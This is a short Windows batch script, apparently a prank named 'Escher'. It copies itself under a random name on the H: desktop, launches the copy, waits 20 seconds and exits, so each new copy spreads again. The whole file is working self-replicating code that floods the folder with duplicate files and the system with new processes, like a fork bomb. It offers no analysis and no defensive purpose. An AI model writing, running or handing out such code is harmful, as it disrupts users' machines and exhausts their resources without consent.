cls
@echo off
H:
cd desktop >nul
set num=%random%%random%
copy Escher*.bat Escher%num%.bat >nul
start "My man Escher" Escher%num%.bat
timeout /t 20 /nobreak >NUL
exit
::Escher is my man